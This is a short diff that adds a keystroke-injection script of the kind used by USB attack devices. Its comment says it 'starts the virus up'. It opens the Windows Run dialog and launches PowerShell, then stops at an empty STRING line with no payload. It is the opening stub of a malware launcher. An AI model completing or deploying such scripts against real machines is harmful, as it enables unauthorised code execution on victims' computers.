@@ -1,0 +1,6 @@
+REM starts the virus up
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+STRING 
